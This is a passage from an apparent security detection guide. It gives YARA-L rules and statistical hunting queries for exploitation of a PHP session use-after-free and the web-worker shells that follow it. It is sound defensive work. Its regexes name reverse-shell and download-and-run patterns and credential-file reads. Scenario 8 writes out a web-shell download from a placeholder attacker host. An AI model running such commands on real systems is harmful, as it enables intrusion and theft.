  $diff_sq = $diff * $diff
  $safe_lambda = if($lambda > 0.01, $lambda, 0.01)
  $poisson_z_sq = $diff_sq / $safe_lambda
  $lag_seconds = max($host_online_baseline.host_max_ts) - max($daily_tool_counts.bucket_max_ts)
  $is_latest_day = if($lag_seconds < 86400, 1, 0)

condition:
  $baseline_active_samples >= 7
  and $is_latest_day = 1
  and $observation_count >= 1
  and $baseline_mean <= 0.5
  and $observation_count > $baseline_mean
  and $poisson_z_sq >= 12.25

order:
  $poisson_z_sq desc
```

#### Query 3B: Two-Part Hurdle on Web Worker Sensitive File & Procfs Memory Reads
```yara
// ============================================================================
// Copyright 2026 Google LLC. All Rights Reserved.
// Author: Greg Kushmerek
// Goal: Detect web worker processes reading /etc/shadow, /etc/sudoers, or /proc/(self|<PID>)/(maps|mem|environ).
// Statistical Model: Two-Part Hurdle Outlier Model (Single Raw Stage, Dormant Awakening Volume Gate & Positive-Rectified LOO Intensity Z)
// Template: secops-statistical-hunter/templates/pipelines/two_part_hurdle_2stage.yl2
// ============================================================================

stage entity_historical {
    metadata.event_type = "FILE_READ"
    re.regex(principal.process.file.full_path, `(?i)/(apache2|httpd|php-fpm[0-9.]*|php|php-cgi|lsphp)$`)
    re.regex(target.file.full_path, `/(etc/(shadow|sudoers)|proc/(self|[0-9]+)/(maps|mem|environ))$`)
    principal.hostname = $entity
    $entity != ""

  match:
    $entity by 1d
  outcome:
    $bucket_count = count(metadata.id)
    $bucket_count_sq = 1.0 * count(metadata.id) * count(metadata.id)
    $distinct_targets = count_distinct(target.file.full_path)
    $sample_target = array_distinct(target.file.full_path)
}

stage entity_stats {
    $entity = $entity_historical.entity

  match:
    $entity
  outcome:
    $sum_x = sum($entity_historical.bucket_count)
    $sum_x2 = sum($entity_historical.bucket_count_sq)
    $active_samples = count($entity_historical.window_start)
}

$entity = $entity_historical.entity
$entity = $entity_stats.entity
$window_start = $entity_historical.window_start

match:
  $entity, $window_start by 1d

outcome:
  // 6 Core Evidence Pillars
  $observation_count = max($entity_historical.bucket_count)
  $baseline_active_samples = max($entity_stats.active_samples)
  $fleet_prevalence = 0 - 1
  $distinct_binaries = max($entity_historical.distinct_targets)
  $sample_commands = array_distinct($entity_historical.sample_target)

  // Leave-One-Out Continuous Intensity Standardization (Positive-Rectified)
  $raw_n_prior = $baseline_active_samples - 1
  $n_prior = if($raw_n_prior > 1, $raw_n_prior, 1)
  $raw_loo_sum = max($entity_stats.sum_x) - $observation_count
  $loo_sum = if($raw_loo_sum > 0, $raw_loo_sum, 0)
  $baseline_mean = 1.0 * $loo_sum / $n_prior
  $raw_loo_var = ((max($entity_stats.sum_x2) - (1.0 * $observation_count * $observation_count)) / $n_prior) - ($baseline_mean * $baseline_mean)
  $floor_var = if($baseline_mean > 1.0, $baseline_mean, 1.0)
  $safe_var = if($raw_loo_var > $floor_var, $raw_loo_var, $floor_var)
  $baseline_dispersion = math.sqrt($safe_var)
  $raw_intensity_z = ($observation_count - $baseline_mean) / $baseline_dispersion
  $intensity_z = if($raw_intensity_z > 0.0, $raw_intensity_z, 0.0)

  // Dormant Awakening Branch (min_awakening_volume = 1, active_samples <= 2)
  $dormant_raw = 3.0 * (1.0 * $observation_count / 1.0)
  $dormant_score = if($observation_count >= 1, $dormant_raw, 0.0)
  $hurdle_threat_score = if($baseline_active_samples <= 2, $dormant_score, $intensity_z)

condition:
  $observation_count >= 1
  and $hurdle_threat_score >= 3.0

order:
  $hurdle_threat_score desc
```

---

### Scenario 4: Session Upload Progress High-Concurrency Seeding Burst

#### A. Baseline Static YARA-L 2.0 Rule
Inflating a files-backed PHP session via `PHP_SESSION_UPLOAD_PROGRESS` (RFC1867) to trigger a session-decoder OOM and cross-request UAF typically involves a rapid burst of concurrent multipart POST requests accompanied by an HTTP 500 error:

```yara
rule network_php_session_upload_progress_uaf_burst {
  meta:
    description = "Detects >= 50 concurrent large HTTP POST requests to a PHP endpoint accompanied by an HTTP 500 bailout over 5m."
    severity = "High"
    mitre_tactic = "TA0001"
    mitre_technique = "T1190"

  events:
    $seed.metadata.event_type = "NETWORK_HTTP"
    $seed.network.http.method = "POST"
    $seed.network.sent_bytes >= 32768
    re.regex($seed.target.url, `\.php(\b|$|\?)`) nocase
    not re.regex($seed.target.url, `(speedtest|myspeed|/ul/upload\.php)`) nocase
    $client_ip = $seed.principal.ip
    $target_ip = $seed.target.ip

    $oom.metadata.event_type = "NETWORK_HTTP"
    $oom.network.http.method = "POST"
    $oom.network.http.response_code = 500
    re.regex($oom.target.url, `\.php(\b|$|\?)`) nocase
    $oom.principal.ip = $client_ip
    $oom.target.ip = $target_ip

  match:
    $client_ip, $target_ip over 5m

  condition:
    #seed >= 50 and $oom
}
```

#### B. Where the Static Rule Struggles
1. **Hard `#seed >= 50` Threshold**: An attacker who seeds the session with 30 slightly larger POST requests triggers the exact same UAF while staying under `#seed >= 50`.
2. **Manual URL Exclusions**: Bulk upload endpoints and custom speedtest utilities that aren't named `speedtest` or `myspeed` continuously trip the static count.

#### C. Whole UEBA Harness Queries

* **Query 4A (`poisson_burst_clustering_2stage.yl2`)**: Computes the **Zero-Inclusive Fano Factor** ($F = \sigma^2 / \mu \ge 4.0$) across $T = 24$ hourly buckets (`by 1h`) per target server (`target.ip`). Busy upload servers receive steady traffic throughout the day ($F \approx 1$), whereas an exploit seeding wave arrives as a concentrated spike surrounded by silent hours ($F \gg 4.0$).
* **Query 4B (`http_error_ratio_surge_2stage.yl2`)**: Evaluates the server's 30-day HTTP error baseline (`metrics.http_queries_fail`, with count dispersion floor $\max(\sigma, \sqrt{\max(\mu, 1.0)})$ and $\ge 7$ active baseline days) alongside total HTTP traffic to isolate servers experiencing both a statistical surge in errors ($Z \ge 3.0\sigma$) and an elevated failure-to-total ratio ($\ge 0.25$).

#### Query 4A: Zero-Inclusive Poisson Burst Clustering (Fano Factor) on Large PHP POST Uploads
```yara
// ============================================================================
// Copyright 2026 Google LLC. All Rights Reserved.
// Author: Greg Kushmerek
// Goal: Detect high-concurrency PHP session upload seeding bursts via Zero-Inclusive Poisson Fano Factor dispersion.
// Statistical Model: Zero-Inclusive Poisson Dispersion via Fano Factor (poisson_burst_clustering_2stage.yl2)
// Template: secops-statistical-hunter/templates/pipelines/poisson_burst_clustering_2stage.yl2
// ============================================================================

stage hourly_failures {
    metadata.event_type = "NETWORK_HTTP"
    network.http.method = "POST"
    network.sent_bytes >= 16384
    re.regex(target.url, `(?i)\.php(\b|$|\?)`)
    target.ip = $entity
    $entity != ""

  match:
    $entity by 1h
  outcome:
    $hourly_fails = count(metadata.id)
    $hourly_fails_sq = 1.0 * count(metadata.id) * count(metadata.id)
    $sample_peers = array_distinct(principal.ip)
}

stage dispersion_baseline {
    $entity = $hourly_failures.entity

  match:
    $entity
  outcome:
    $sum_x = sum($hourly_failures.hourly_fails)
    $sum_x2 = sum($hourly_failures.hourly_fails_sq)
    $active_hours = count($hourly_failures.window_start)
}

stage fleet_breadth {
    $ws = $hourly_failures.window_start

  match:
    $ws by 1h
  outcome:
    $fleet_users = sum(if($hourly_failures.hourly_fails >= 15, 1, 0))
}

$entity = $hourly_failures.entity
$entity = $dispersion_baseline.entity
$ws = $hourly_failures.window_start
$ws = $fleet_breadth.ws

match:
  $entity
outcome:
  $sum_x = max($dispersion_baseline.sum_x)
  $sum_x2 = max($dispersion_baseline.sum_x2)
  $zero_incl_mean = 1.0 * $sum_x / 24.0
  $mean_sq = 1.0 * $sum_x2 / 24.0
  $raw_var = $mean_sq - ($zero_incl_mean * $zero_incl_mean)
  $zero_incl_var = if($raw_var > 0.0, $raw_var, 0.0)
  $zero_incl_sd = math.sqrt($zero_incl_var)
  $safe_mean = if($zero_incl_mean > 0.0, $zero_incl_mean, 1.0)
  $raw_fano = $zero_incl_var / $safe_mean
  $fano_factor = if($zero_incl_mean > 0.0, $raw_fano, 0.0)

  // 6 Core Evidence Pillars
  $observation_count = $sum_x
  $baseline_active_samples = max($dispersion_baseline.active_hours)
  $baseline_mean = $zero_incl_mean
  $baseline_dispersion = $zero_incl_sd
  $fleet_prevalence = max($fleet_breadth.fleet_users)
  $distinct_binaries = $sum_x
  $sample_commands = array_distinct($hourly_failures.sample_peers)

condition:
  $baseline_active_samples >= 1
  and $observation_count >= 15
  and $baseline_mean >= 0.5
  and $fano_factor >= 4.0

order:
  $fano_factor desc
```

#### Query 4B: 30-Day HTTP Failure Surge & Ratio (`metrics.http_queries_fail`)
```yara
// ============================================================================
// Copyright 2026 Google LLC. All Rights Reserved.
// Author: Greg Kushmerek
// ARCHITECTURE: 2-STAGE HTTP ERROR RATIO & RECONNAISSANCE SURGE PIPELINE
// Goal: Hunt for web servers with anomalous 30-day HTTP error Z-scores and failure ratios.
// Statistical Model: Two-Part Error Surge & Target Breadth Outlier (http_error_ratio_surge_2stage.yl2)
// Template: secops-risk-metrics-multistage/templates/pipelines/http_error_ratio_surge_2stage.yl2
// ============================================================================

stage stage1_http_failure_surge {
    (network.http.method != "" or network.http.user_agent != "" or network.http.response_code != 0 or network.http.referral_url != "")
    network.http.response_code >= 400
    principal.asset.ip = $host
    $host != ""

  match:
    $host by 1d

  outcome:
    $failed_obs = count(metadata.id)
    $distinct_error_targets = count_distinct(target.ip)
    $distinct_error_uris = count_distinct(target.url)
    $sample_uris = array_distinct(target.url)

    $hist_fail_avg = max(metrics.http_queries_fail(
        period: 1d, window: 30d, metric: event_count_sum, agg: avg,
        principal.asset.ip: principal.asset.ip
    ))
    $hist_fail_stddev = max(metrics.http_queries_fail(
        period: 1d, window: 30d, metric: event_count_sum, agg: stddev,
        principal.asset.ip: principal.asset.ip
    ))
    $hist_fail_active_days = max(metrics.http_queries_fail(
        period: 1d, window: 30d, metric: event_count_sum, agg: num_metric_periods,
        principal.asset.ip: principal.asset.ip
    ))
}

stage stage2_total_traffic {
    (network.http.method != "" or network.http.user_agent != "" or network.http.response_code != 0 or network.http.referral_url != "")
    principal.asset.ip = $host
    $host != ""

  match:
    $host by 1d

  outcome:
    $total_obs = count(metadata.id)
}

$host = $stage1_http_failure_surge.host
$host = $stage2_total_traffic.host
$ws = $stage1_http_failure_surge.window_start
$ws = $stage2_total_traffic.window_start

match:
  $host, $ws by 1d

outcome:
  $observed_fails = max($stage1_http_failure_surge.failed_obs)
  $hist_avg = max($stage1_http_failure_surge.hist_fail_avg)
  $hist_std = max($stage1_http_failure_surge.hist_fail_stddev)
  $active_days = max($stage1_http_failure_surge.hist_fail_active_days)
  $total_events = max($stage2_total_traffic.total_obs)
  $distinct_targets = max($stage1_http_failure_surge.distinct_error_targets)
  $distinct_uris = max($stage1_http_failure_surge.distinct_error_uris)
  $sample_paths = array_distinct($stage1_http_failure_surge.sample_uris)

  $floor_base = if($hist_avg > 1.0, $hist_avg, 1.0)
  $dispersion_floor = math.sqrt($floor_base)
  $safe_fail_std = if($hist_std > $dispersion_floor, $hist_std, $dispersion_floor)
  $fail_z = ($observed_fails - $hist_avg) / $safe_fail_std
  $fail_ratio = $observed_fails / ($total_events + 0.001)
  $recon_score = $fail_z * $fail_ratio

condition:
  $active_days >= 7
  and $fail_z >= 3.0
  and $fail_ratio >= 0.25
  and $distinct_uris >= 1

order:
  $recon_score desc
```

---

### Scenario 5: Stale Session ID Cross-Request Memory Disclosure

#### A. Baseline Static YARA-L 2.0 Rule
When an OOM `longjmp()` leaves a stale `PS(id)` pointer dangling, a subsequent request can bleed server heap memory back to the attacker inside an oversized HTTP 500 response:

```yara
rule network_php_stale_session_id_memory_disclosure {
  meta:
    description = "Detects consecutive large HTTP POST requests triggering HTTP 500 bailouts where the follow-up HTTP 500 response exceeds 60 KB."
    severity = "High"
    mitre_tactic = "TA0009"
    mitre_technique = "T1190"

  events:
    $trigger.metadata.event_type = "NETWORK_HTTP"
    $trigger.network.http.method = "POST"
    $trigger.network.http.response_code = 500
    $trigger.network.sent_bytes >= 262144
    re.regex($trigger.target.url, `(\.php(\b|$|\?)|/sites/default/|/\?q=)`) nocase
    $client_ip = $trigger.principal.ip
    $target_ip = $trigger.target.ip

    $followup.metadata.event_type = "NETWORK_HTTP"
    $followup.network.http.method = "POST"
    $followup.network.http.response_code = 500
    $followup.network.sent_bytes >= 262144
    $followup.network.received_bytes >= 60000
    re.regex($followup.target.url, `(\.php(\b|$|\?)|/sites/default/|/\?q=)`) nocase
    $followup.principal.ip = $client_ip
    $followup.target.ip = $target_ip

    $trigger.metadata.event_timestamp.seconds <= $followup.metadata.event_timestamp.seconds
    $trigger.metadata.id != $followup.metadata.id

  match:
    $client_ip, $target_ip over 5m

  condition:
    $trigger and $followup
}
```

#### B. Where the Static Rule Struggles
1. **Sub-60KB Heap Bleeds**: Leaking heap pointers, session tokens, or encryption keys in a `Set-Cookie` header often adds only **4 KB to 32 KB** to the response—completely invisible to `received_bytes >= 60000`.
2. **Verbose Debug Pages**: Applications configured with verbose stack traces routinely return > 60 KB on every HTTP 500 error.

#### C. Whole UEBA Harness Query

* **Query 5 (`mad_modified_z_4stage.yl2`)**: Uses **Median Absolute Deviation (MAD)** and the **Iglewicz-Hoaglin Modified Z-Score** ($M_Z > 3.5$, requiring $\ge 7$ active HTTP 500 days) on `max(network.received_bytes)` per server across active days. A production web server normally returns a static error page (e.g., 900 bytes every active error day, $\text{MAD} \approx 0$, falling back smoothly to scaled mean absolute deviation or `512.0` B). If that server suddenly returns a 12 KB HTTP 500 response, its Modified Z-Score spikes dramatically—while a dev server that always returns 80 KB stack traces has an 80 KB median and stays quiet.

#### Query 5: Standalone 4-Stage MAD / Modified Z-Score on HTTP 500 Response Sizes
```yara
// ============================================================================
// Copyright 2026 Google LLC. All Rights Reserved.
// Author: Greg Kushmerek
// Goal: Detect anomalous server heap memory bleed in HTTP 500 response sizes via Median Absolute Deviation (MAD).
// Statistical Model: Modified Z-Score (Iglewicz & Hoaglin, 1993) (mad_modified_z_4stage.yl2)
// Template: secops-statistical-hunter/templates/pipelines/mad_modified_z_4stage.yl2
// ============================================================================

stage daily_stats {
    metadata.event_type = "NETWORK_HTTP"
    network.http.method = "POST"
    network.http.response_code = 500
    network.received_bytes > 0
    target.ip = $entity
    $entity != ""

  match:
    $entity by 1d
  outcome:
    $daily_value = max(network.received_bytes)
    $distinct_sample_values = count_distinct(principal.ip)
    $sample_data = array_distinct(target.url)
}

stage median_stats {
    $entity = $daily_stats.entity

  match:
    $entity
  outcome:
    $baseline_median = window.median($daily_stats.daily_value, false)
}

stage mad_stats {
    $entity = $daily_stats.entity
    $entity = $median_stats.entity

  match:
    $entity
  outcome:
    $mad = window.median(math.abs($daily_stats.daily_value - $median_stats.baseline_median), false)
    $mean_abs_dev = avg(math.abs($daily_stats.daily_value - $median_stats.baseline_median))
    $median_val = max($median_stats.baseline_median)
    $active_days = count_distinct($daily_stats.window_start)
}

$entity = $daily_stats.entity
$entity = $mad_stats.entity
$window_start = $daily_stats.window_start

match:
  $entity, $window_start by 1d
outcome:
  // 6 Core Evidence Pillars
  $observation_count = max($daily_stats.daily_value)
  $baseline_active_samples = max($mad_stats.active_days)
  $baseline_median = max($mad_stats.median_val)
  $baseline_mean = max($mad_stats.median_val)
  $baseline_dispersion = max($mad_stats.mad)
  $baseline_mean_abs_dev = max($mad_stats.mean_abs_dev)
  $fleet_prevalence = 0 - 1
  $distinct_binaries = max($daily_stats.distinct_sample_values)
  $sample_commands = array_distinct($daily_stats.sample_data)

  // Robust scale with Iglewicz-Hoaglin MAD=0 fallback
  $scale_from_mad = $baseline_dispersion / 0.6745
  $scale_from_meanad = $baseline_mean_abs_dev * 1.253314
  $robust_scale = if($baseline_dispersion > 0, $scale_from_mad, $scale_from_meanad)
  $safe_robust_scale = if($robust_scale > 0, $robust_scale, 512.0)
  $m_z_score = ($observation_count - $baseline_median) / $safe_robust_scale

condition:
  $baseline_active_samples >= 7
  and $observation_count >= 4096
  and $m_z_score > 3.5

order:
  $m_z_score desc
```

---

### Scenario 6: Container Namespace Debugger Attachment (`PS(mod_data)`)

#### A. Baseline Static YARA-L 2.0 Rule
When developing exploits or inspecting process memory across container procfs namespaces, attackers attach debuggers (`gdb`, `lldb`, `strace`) to live Apache or PHP workers:

```yara
rule linux_php_session_moddata_uaf_debugger_trace {
  meta:
    description = "Detects GDB, LLDB, or strace attachment targeting live Apache or PHP worker processes."
    severity = "High"
    mitre_tactic = "TA0004"
    mitre_technique = "T1055.008"

  events:
    $e.principal.platform = "LINUX"
    $e.metadata.event_type = "PROCESS_LAUNCH"
    re.regex($e.target.process.file.full_path, `/(gdb|lldb|strace)$`) nocase
    (
      re.regex($e.target.process.command_line, `/proc/[0-9]+/root/usr/(sbin|bin)/(apache2|httpd|php-fpm[0-9.]*|php)`) nocase or
      re.regex($e.target.process.command_line, `sharedlibrary\s+libphp`) nocase or
      (
        re.regex($e.target.process.command_line, `\battach\s+[0-9]+`) nocase and
        re.regex($e.target.process.command_line, `\b(apache2|httpd|php-fpm|php|libphp)\b`) nocase
      )
    )
    $hostname = $e.principal.hostname

  match:
    $hostname over 5m

  condition:
    $e
}
```

#### B. Where the Static Rule Struggles
1. **PID-Only Attachment**: Running `gdb -p 4192` or `gcore 4192` attaches by numeric PID without ever mentioning `apache2`, `php`, or `libphp` on the command line—completely bypassing the static regex.

#### C. Whole UEBA Harness Query

* **Query 6 (`markov_2gram_transition_rarity_2stage.yl2`)**: Evaluates the **Whole-Window Laplace-Smoothed Markov 2-Gram Transition Probability** $P(\text{Debugger} \mid \text{Parent}) = (N_{\text{pair}} + 1) / (N_{\text{parent}} + 100)$ and **Information Surprisal** $I = \ln((N_{\text{parent}} + 100) / (N_{\text{pair}} + 1)) \ge 3.0$ across all parent child-launches on the host, flagging unexpected `gdb`, `lldb`, `strace`, `ltrace`, `gcore`, and `perf` spawns without requiring `apache2` or `libphp` substrings in the command line.

#### Query 6: Whole-Window Laplace-Smoothed Markov 2-Gram Surprisal on Debugger Attachments
```yara
// ============================================================================
// Copyright 2026 Google LLC. All Rights Reserved.
// Author: Greg Kushmerek
// Goal: Detect rare parent-to-debugger process execution transitions (gdb, lldb, strace, ltrace, gcore, perf) via Whole-Window Laplace-Smoothed Markov 2-Gram Surprisal.
// Statistical Model: Laplace-Smoothed Markov 2-Gram Information Surprisal (markov_2gram_transition_rarity_2stage.yl2)
// Template: secops-statistical-hunter/templates/pipelines/markov_2gram_transition_rarity_2stage.yl2
// ============================================================================

stage child_transition {
    metadata.event_type = "PROCESS_LAUNCH"
    $etype = metadata.event_type
    principal.hostname = $host
    $host != ""
    $parent = principal.process.file.full_path
    $child = target.process.file.full_path
    $parent != ""
    $child != ""

  match:
    $etype, $host, $parent, $child by 1d

  outcome:
    $transition_count = count(metadata.id)
    $debugger_count = sum(if(re.regex(target.process.file.full_path, `/(gdb|lldb|strace|ltrace|gcore|perf)$`), 1, 0))
    $sample_command = array_distinct(target.process.command_line)
}

stage pair_window_totals {
    $etype = $child_transition.etype
    $host = $child_transition.host
    $parent = $child_transition.parent
    $child = $child_transition.child

  match:
    $etype, $host, $parent, $child

  outcome:
    $total_pair_launches = sum($child_transition.transition_count)
}

stage parent_window_totals {
    $etype = $child_transition.etype
    $host = $child_transition.host
    $parent = $child_transition.parent

  match:
    $etype, $host, $parent

  outcome:
    $total_parent_launches = sum($child_transition.transition_count)
}

$etype = $child_transition.etype
$etype = $pair_window_totals.etype
$etype = $parent_window_totals.etype
$host = $child_transition.host
$host = $pair_window_totals.host
$host = $parent_window_totals.host
$parent = $child_transition.parent
$parent = $pair_window_totals.parent
$parent = $parent_window_totals.parent
$child = $child_transition.child
$child = $pair_window_totals.child
$ws = $child_transition.window_start

match:
  $host, $parent, $child, $ws by 1d

outcome:
  $transition_launches = max($child_transition.transition_count)
  $window_pair_launches = max($pair_window_totals.total_pair_launches)
  $window_parent_launches = max($parent_window_totals.total_parent_launches)
  $debugger_launches = max($child_transition.debugger_count)
  $sample_commands = array_distinct($child_transition.sample_command)

  // Laplace-Smoothed Conditional Transition Probability & Surprisal (V = 100.0)
  $transition_prob = ($window_pair_launches + 1.0) / ($window_parent_launches + 100.0)
  $markov_threat_score = math.log(($window_parent_launches + 100.0) / ($window_pair_launches + 1.0))

  // 6 Core Evidence Pillars
  $observation_count = $transition_launches
  $baseline_active_samples = $window_parent_launches
  $baseline_mean = $transition_prob
  $baseline_dispersion = $markov_threat_score
  $fleet_prevalence = 0 - 1
  $distinct_binaries = 1

condition:
  $debugger_launches >= 1
  and $window_parent_launches >= 5
  and $markov_threat_score >= 3.0

order:
  $markov_threat_score desc
```

---

### Scenario 7: Web Worker Crash or Core Dump After OOM

#### A. Baseline Static YARA-L 2.0 Rule
Heap corruption during `longjmp()` UAF exploitation frequently causes worker segmentation faults handled by `systemd-coredump`, `apport`, or `abrt-hook-ccpp`:

```yara
rule linux_php_worker_crash_after_session_or_http_oom {
  meta:
    description = "Detects when an Apache or PHP worker process triggers a Linux crash dump handler."
    severity = "High"
    mitre_tactic = "TA0001"
    mitre_technique = "T1190"

  events:
    $crash.principal.platform = "LINUX"
    $crash.metadata.event_type = "PROCESS_LAUNCH"
    re.regex($crash.target.process.file.full_path, `/(systemd-coredump|apport|abrt-hook-ccpp)$`) nocase
    re.regex($crash.target.process.command_line, `([/!]|^)(apache2|httpd|php-fpm[0-9.]*|php-cgi|php[0-9.]*|lsphp)(\s|$|"|')`) nocase
    $hostname = $crash.principal.hostname

  match:
    $hostname over 5m

  condition:
    $crash
}
```

#### B. Where the Static Rule Struggles
1. **Chronic Extension Segfaults vs. True Exploitation**: A legacy server with a buggy C extension that crashes once a day triggers this rule endlessly, whereas a stable server crashing for the first time in the lookback window (or crashing 25 times in 5 minutes during heap-spray brute forcing) is a high-priority signal.

#### C. Whole UEBA Harness Query

* **Query 7 (`two_part_hurdle_2stage.yl2`)**: Applies a single-raw-stage Leave-One-Out Two-Part Hurdle model per host. Stable servers ($\le 2$ active crash days in the window) trip the discrete dormancy gate on the very first crash ($3.0 \times \text{Observed} \ge 3.0$); chronically unstable hosts are evaluated via positive-rectified Leave-One-Out Z-score intensity ($Z_{\text{LOO}} \ge 3.0\sigma$ with $\sqrt{\max(\mu_{\text{LOO}}, 1.0)}$ dispersion floor), firing only on an abnormal burst of crashes.

#### Query 7: Two-Part Hurdle on Web Worker Crash Dump Handlers
```yara
// ============================================================================
// Copyright 2026 Google LLC. All Rights Reserved.
// Author: Greg Kushmerek
// Goal: Detect dormant web servers suddenly triggering Linux crash dump handlers for PHP/Apache workers.
// Statistical Model: Two-Part Hurdle Outlier Model (Single Raw Stage, Dormant Awakening Volume Gate & Positive-Rectified LOO Intensity Z)
// Template: secops-statistical-hunter/templates/pipelines/two_part_hurdle_2stage.yl2
// ============================================================================

stage entity_historical {
    metadata.event_type = "PROCESS_LAUNCH"
    re.regex(target.process.file.full_path, `(?i)/(systemd-coredump|apport|abrt-hook-ccpp)$`)
    re.regex(target.process.command_line, `(?i)(apache2|httpd|php-fpm|php-cgi|php|lsphp)`)
    principal.hostname = $entity
    $entity != ""

  match:
    $entity by 1d
  outcome:
    $bucket_count = count(metadata.id)
    $bucket_count_sq = 1.0 * count(metadata.id) * count(metadata.id)
    $distinct_targets = count_distinct(target.process.file.full_path)
    $sample_target = array_distinct(target.process.command_line)
}

stage entity_stats {
    $entity = $entity_historical.entity

  match:
    $entity
  outcome:
    $sum_x = sum($entity_historical.bucket_count)
    $sum_x2 = sum($entity_historical.bucket_count_sq)
    $active_samples = count($entity_historical.window_start)
}

$entity = $entity_historical.entity
$entity = $entity_stats.entity
$window_start = $entity_historical.window_start

match:
  $entity, $window_start by 1d

outcome:
  // 6 Core Evidence Pillars
  $observation_count = max($entity_historical.bucket_count)
  $baseline_active_samples = max($entity_stats.active_samples)
  $fleet_prevalence = 0 - 1
  $distinct_binaries = max($entity_historical.distinct_targets)
  $sample_commands = array_distinct($entity_historical.sample_target)

  // Leave-One-Out Continuous Intensity Standardization (Positive-Rectified)
  $raw_n_prior = $baseline_active_samples - 1
  $n_prior = if($raw_n_prior > 1, $raw_n_prior, 1)
  $raw_loo_sum = max($entity_stats.sum_x) - $observation_count
  $loo_sum = if($raw_loo_sum > 0, $raw_loo_sum, 0)
  $baseline_mean = 1.0 * $loo_sum / $n_prior
  $raw_loo_var = ((max($entity_stats.sum_x2) - (1.0 * $observation_count * $observation_count)) / $n_prior) - ($baseline_mean * $baseline_mean)
  $floor_var = if($baseline_mean > 1.0, $baseline_mean, 1.0)
  $safe_var = if($raw_loo_var > $floor_var, $raw_loo_var, $floor_var)
  $baseline_dispersion = math.sqrt($safe_var)
  $raw_intensity_z = ($observation_count - $baseline_mean) / $baseline_dispersion
  $intensity_z = if($raw_intensity_z > 0.0, $raw_intensity_z, 0.0)

  // Dormant Awakening Branch (min_awakening_volume = 1, active_samples <= 2)
  $dormant_raw = 3.0 * (1.0 * $observation_count / 1.0)
  $dormant_score = if($observation_count >= 1, $dormant_raw, 0.0)
  $hurdle_threat_score = if($baseline_active_samples <= 2, $dormant_score, $intensity_z)

condition:
  $observation_count >= 1
  and $hurdle_threat_score >= 3.0

order:
  $hurdle_threat_score desc
```

---

### Scenario 8: PHP2Shell Web Worker Post-Exploitation RCE

#### A. Baseline Static YARA-L 2.0 Rule
Once RCE is achieved inside an Apache or PHP-FPM worker, the attacker spawns a shell or utility. Because legacy PHP applications frequently invoke `system()` or `exec()` for benign tasks (`sendmail`, `wkhtmltopdf`, `certbot`), static rules are forced to add strict command-line regexes:

```yara
rule linux_php2shell_web_worker_rce {
  meta:
    description = "Detects when an Apache or PHP worker spawns a shell or network utility with suspicious command-line patterns."
    severity = "Critical"
    mitre_tactic = "TA0002"
    mitre_technique = "T1059.004"

  events:
    $e.principal.platform = "LINUX"
    $e.metadata.event_type = "PROCESS_LAUNCH"
    re.regex($e.principal.process.file.full_path, `/(apache2|httpd|php-fpm[0-9.]*|php-cgi|lsphp)$`) nocase
    re.regex($e.target.process.file.full_path, `/(sh|bash|dash|zsh|ksh|curl|wget|nc|ncat|netcat|socat)$`) nocase
    re.regex($e.target.process.command_line, `(\b(curl|wget)\b.*(\|\s*(/(usr/)?bin/)?(sh|bash|dash|zsh|python[0-9.]*|perl|php)\b|(-o|-O)\s*/(tmp|var/tmp|dev/shm)/)|\b(nc|ncat|netcat)\s+([^;|&]*\s+)?(-e|-c|--exec|--sh-exec)\s+|\bsocat\b.*\b(exec|system|pty):|\bbase64\s+(-d|--decode)\b|/dev/(tcp|udp)/|/etc/shadow)`) nocase
    not re.regex($e.target.process.command_line, `(sendmail|postdrop|postfix|apache2ctl|certbot|pdftk|wkhtmltopdf|ghostscript)`) nocase
    $hostname = $e.principal.hostname

  match:
    $hostname over 5m

  condition:
    $e
}
```

#### B. Where the Static Rule Struggles
1. **Severe Command-Line Blind Spots**: Because the rule requires matching the positive command-line regex, if a compromised PHP worker runs `/bin/bash -i`, `whoami`, `id`, `cat /var/www/html/wp-config.php`, or `curl https://attacker.com/shell.php -o /var/www/html/shell.php` (saving to `/var/www/` instead of `/tmp/`), **the static rule does not fire**.

#### C. Whole UEBA Harness Queries

* **Query 8A (`markov_2gram_transition_rarity_2stage.yl2`)**: Computes the **Whole-Window Laplace-Smoothed Markov 2-Gram Transition Probability** $P(\text{Child} \mid \text{Web Worker}) = (N_{\text{pair}} + 1) / (N_{\text{parent}} + 100)$ for **every** child binary spawned by a web worker—with zero command-line regex restrictions. Benign helpers (`sendmail`, `wkhtmltopdf`) execute hundreds of times across the window ($I = \ln((N_{\text{parent}} + 100) / (N_{\text{pair}} + 1)) \to 0$) and self-suppress; an unexpected `/bin/bash`, `id`, or `curl` transition produces high surprisal ($I \ge 3.0$).
* **Query 8B (`rollup_sector_fusion_4stage.yl2`)**: Fuses the host's 30-day `metrics.file_executions_total` baseline (rolled up over `(metadata.event_type, principal.process.file.sha256)` with $\sqrt{2\ln K_{\text{eff}}}$ extreme-value multiplicity offset and $\ge 7$ active days) with its 30-day `metrics.network_bytes_outbound` baseline (`44,979.0` B byte dispersion floor, $\ge 7$ active days) on a shared entity-union spine into a rectified Euclidean threat norm ($D^2 = Z_{\text{exec}}^2 + Z_{\text{egress}}^2 \ge 12.25 \iff D \ge 3.5\sigma$).

#### Query 8A: Whole-Window Markov 2-Gram Lineage Surprisal from Web Worker Parents
```yara
// ============================================================================
// Copyright 2026 Google LLC. All Rights Reserved.
// Author: Greg Kushmerek
// Goal: Detect rare parent-child process transitions spawned by Apache/PHP web workers via Whole-Window Laplace-Smoothed Markov 2-Gram Surprisal.
// Statistical Model: Laplace-Smoothed Markov 2-Gram Information Surprisal (markov_2gram_transition_rarity_2stage.yl2)
// Template: secops-statistical-hunter/templates/pipelines/markov_2gram_transition_rarity_2stage.yl2
// ============================================================================

stage child_transition {
    metadata.event_type = "PROCESS_LAUNCH"
    $etype = metadata.event_type
    re.regex(principal.process.file.full_path, `(?i)/(apache2|httpd|php-fpm[0-9.]*|php-cgi|lsphp)$`)
    principal.hostname = $host
    $host != ""
    $parent = principal.process.file.full_path
    $child = target.process.file.full_path
    $parent != ""
    $child != ""

  match:
    $etype, $host, $parent, $child by 1d

  outcome:
    $transition_count = count(metadata.id)
    $sample_command = array_distinct(target.process.command_line)
}

stage pair_window_totals {
    $etype = $child_transition.etype
    $host = $child_transition.host
    $parent = $child_transition.parent
    $child = $child_transition.child

  match:
    $etype, $host, $parent, $child

  outcome:
    $total_pair_launches = sum($child_transition.transition_count)
}

stage parent_window_totals {
    $etype = $child_transition.etype
    $host = $child_transition.host
    $parent = $child_transition.parent

  match:
    $etype, $host, $parent

  outcome:
    $total_parent_launches = sum($child_transition.transition_count)
}

$etype = $child_transition.etype
$etype = $pair_window_totals.etype
$etype = $parent_window_totals.etype
$host = $child_transition.host
$host = $pair_window_totals.host
